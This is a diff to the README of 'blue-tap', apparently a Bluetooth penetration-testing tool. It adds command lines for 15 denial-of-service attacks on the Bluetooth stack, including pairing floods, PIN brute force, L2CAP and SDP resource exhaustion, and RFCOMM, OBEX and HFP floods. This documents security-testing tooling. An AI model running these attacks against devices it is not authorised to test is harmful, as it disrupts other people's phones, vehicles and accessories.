@@ -800,12 +800,36 @@ Campaign results feed directly into the pentest report (`blue-tap report`):
 
 ### 9. Denial of Service
 
-```
+15 protocol-level DoS attacks targeting different layers of the Bluetooth stack.
+
+#### Pairing-Level
+
+```bash
 blue-tap dos pair-flood <MAC>                          # Flood with pairing requests
 blue-tap dos name-flood <MAC>                          # Pair with max-length names (memory exhaustion)
 blue-tap dos rate-test <MAC>                           # Detect rate limiting on pairing
 blue-tap dos pin-brute <MAC>                           # Brute-force legacy PIN pairing
 blue-tap dos l2ping-flood <MAC>                        # L2CAP echo request flood (requires root)
+```
+
+#### L2CAP Signaling
+
+```bash
+blue-tap dos l2cap-config-bomb <MAC>                   # Config option bomb (unknown options force memory allocation)
+blue-tap dos l2cap-cid-exhaust <MAC>                   # CID exhaustion (open channels without configuring)
+blue-tap dos l2cap-echo-amp <MAC>                      # Echo amplification (max-size echo requests)
+```
+
+#### Protocol-Specific
+
+```bash
+blue-tap dos sdp-continuation <MAC>                    # SDP continuation state exhaustion (CVE-2017-0785 related)
+blue-tap dos sdp-des-bomb <MAC>                        # SDP nested DES bomb (recursive parsing overload)
+blue-tap dos rfcomm-sabm-flood <MAC>                   # RFCOMM SABM flood (exhaust all 60 DLCIs)
+blue-tap dos rfcomm-mux-flood <MAC>                    # RFCOMM multiplexer command flood (Test echo on DLCI 0)
+blue-tap dos obex-connect-flood <MAC>                  # OBEX session exhaustion (open all OBEX services)
+blue-tap dos hfp-at-flood <MAC>                        # HFP AT command flood (overwhelm AT parser)
+blue-tap dos hfp-slc-confuse <MAC>                     # HFP SLC state machine confusion (out-of-order commands)
 ```
 
 ---
